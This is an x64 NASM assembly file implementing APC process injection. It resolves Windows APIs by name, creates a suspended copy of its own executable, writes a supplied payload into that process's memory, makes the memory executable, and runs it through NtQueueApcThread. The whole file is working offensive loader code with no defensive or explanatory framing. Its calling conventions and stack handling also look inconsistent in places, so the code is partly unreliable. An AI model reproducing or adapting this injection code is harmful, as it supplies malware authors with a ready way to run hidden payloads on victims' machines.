; APC Injection Implementation (x64 NASM)
; NtQueueApcThread-based process injection
; Author: Matheus Sobral

bits 64
default rel

section .text

extern resolve_api

global apc_inject_self
global create_suspended_process
global queue_apc_and_resume

; Create Suspended Process
; RDI = command line
; RSI = STARTUPINFO pointer
; RDX = PROCESS_INFORMATION pointer
; Returns: RAX = 1 on success, 0 on failure
create_suspended_process:
    push rbp
    mov rbp, rsp
    sub rsp, 64
    
    push rbx
    push r12
    push r13
    
    mov r12, rdi
    mov r13, rsi
    mov rbx, rdx
    
    ; Resolve CreateProcessA
    lea rdi, [kernel32_str]
    lea rsi, [createprocess_str]
    call resolve_api
    test rax, rax
    jz .failed
    
    mov r10, rax
    
    ; Call CreateProcessA
    xor rcx, rcx
    mov rdx, r12
    xor r8, r8
    xor r9, r9
    
    push rbx
    push r13
    push 0
    push 0
    push 0x00000004 | 0x08000000
    push 0
    push 0
    
    call r10
    
    add rsp, 56
    
    test eax, eax
    jz .failed
    
    mov rax, 1
    jmp .done
    
.failed:
    xor rax, rax
    
.done:
    pop r13
    pop r12
    pop rbx
    
    leave
    ret

; Queue APC and Resume Thread
; RDI = process_handle
; RSI = thread_handle
; RDX = apc_routine
; Returns: RAX = 1 on success, 0 on failure
queue_apc_and_resume:
    push rbp
    mov rbp, rsp
    sub rsp, 64
    
    push rbx
    push r12
    push r13
    push r14
    
    mov r12, rdi
    mov r13, rsi
    mov r14, rdx
    
    ; Resolve NtQueueApcThread
    lea rdi, [ntdll_str]
    lea rsi, [ntqueueapc_str]
    call resolve_api
    test rax, rax
    jz .failed
    
    mov rbx, rax
    
    ; Call NtQueueApcThread
    mov rcx, r13
    mov rdx, r14
    xor r8, r8
    xor r9, r9
    push 0
    
    call rbx
    
    add rsp, 8
    
    test eax, eax
    jnz .failed
    
    ; Resolve NtResumeThread
    lea rdi, [ntdll_str]
    lea rsi, [ntresume_str]
    call resolve_api
    test rax, rax
    jz .failed
    
    mov rbx, rax
    
    ; Call NtResumeThread
    mov rcx, r13
    lea rdx, [rsp]
    
    call rbx
    
    test eax, eax
    jnz .failed
    
    mov rax, 1
    jmp .done
    
.failed:
    xor rax, rax
    
.done:
    pop r14
    pop r13
    pop r12
    pop rbx
    
    leave
    ret

; APC Self-Injection
; RDI = payload pointer
; RSI = payload size
; Returns: RAX = 1 on success, 0 on failure
apc_inject_self:
    push rbp
    mov rbp, rsp
    sub rsp, 512
    
    push rbx
    push r12
    push r13
    push r14
    push r15
    
    mov r12, rdi
    mov r13, rsi
    
    ; Get own executable path
    lea rdi, [kernel32_str]
    lea rsi, [getmodulefilename_str]
    call resolve_api
    test rax, rax
    jz .failed
    
    mov rbx, rax
    
    xor rcx, rcx
    lea rdx, [rsp + 256]
    mov r8, 260
    
    call rbx
    
    ; Create suspended process
    lea rdi, [rsp + 256]
    lea rsi, [rsp]
    lea rdx, [rsp + 128]
    call create_suspended_process
    test rax, rax
    jz .failed
    
    ; Get process handle
    mov r14, [rsp + 128]
    mov r15, [rsp + 136]
    
    ; Resolve NtAllocateVirtualMemory
    lea rdi, [ntdll_str]
    lea rsi, [ntallocate_str]
    call resolve_api
    test rax, rax
    jz .failed
    
    mov rbx, rax
    
    ; Allocate memory in target
    mov rcx, r14
    lea rdx, [rsp + 64]
    mov qword [rsp + 64], 0
    xor r8, r8
    lea r9, [rsp + 72]
    mov qword [rsp + 72], r13
    
    push 0x04
    push 0x00003000
    
    call rbx
    
    add rsp, 16
    
    test eax, eax
    jnz .failed
    
    mov r14, [rsp + 64]
    
    ; Resolve WriteProcessMemory
    lea rdi, [kernel32_str]
    lea rsi, [writeprocess_str]
    call resolve_api
    test rax, rax
    jz .failed
    
    mov rbx, rax
    
    ; Write payload
    mov rcx, [rsp + 128]
    mov rdx, r14
    mov r8, r12
    mov r9, r13
    push 0
    
    call rbx
    
    add rsp, 8
    
    test eax, eax
    jz .failed
    
    ; Resolve NtProtectVirtualMemory
    lea rdi, [ntdll_str]
    lea rsi, [ntprotect_str]
    call resolve_api
    test rax, rax
    jz .failed
    
    mov rbx, rax
    
    ; Change to RX
    mov rcx, [rsp + 128]
    lea rdx, [rsp + 64]
    lea r8, [rsp + 72]
    mov r9, 0x20
    lea r10, [rsp + 80]
    push r10
    
    call rbx
    
    add rsp, 8
    
    ; Queue APC and resume
    mov rdi, [rsp + 128]
    mov rsi, [rsp + 136]
    mov rdx, r14
    call queue_apc_and_resume
    
    jmp .done
    
.failed:
    xor rax, rax
    
.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    
    leave
    ret

section .data
kernel32_str: db 'kernel32.dll', 0
ntdll_str: db 'ntdll.dll', 0
createprocess_str: db 'CreateProcessA', 0
getmodulefilename_str: db 'GetModuleFileNameA', 0
writeprocess_str: db 'WriteProcessMemory', 0
ntqueueapc_str: db 'NtQueueApcThread', 0
ntresume_str: db 'NtResumeThread', 0
ntallocate_str: db 'NtAllocateVirtualMemory', 0
ntprotect_str: db 'NtProtectVirtualMemory', 0
